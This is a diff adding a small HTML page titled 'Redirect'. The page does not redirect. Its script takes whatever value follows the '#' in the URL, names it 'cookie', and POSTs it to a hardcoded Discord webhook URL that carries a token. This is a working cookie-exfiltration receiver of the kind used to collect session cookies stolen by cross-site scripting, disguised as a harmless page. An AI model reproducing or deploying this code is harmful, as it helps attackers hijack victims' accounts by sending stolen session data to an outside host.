@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Redirect</title></head>
+<body>
+<script>
+  const cookie = window.location.hash.substring(1);
+  if (cookie) {
+    fetch("https://discord.com/api/webhooks/1501284240484995307/Ov6tKqjQmDxbMaKTYoEfN7QHTEPjqv0XyCnkl3d91dMVM5tlFA6l3B00tsBoOvdYo7kq", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: cookie })
+    });
+  }
+</script>
+</body>
+</html>
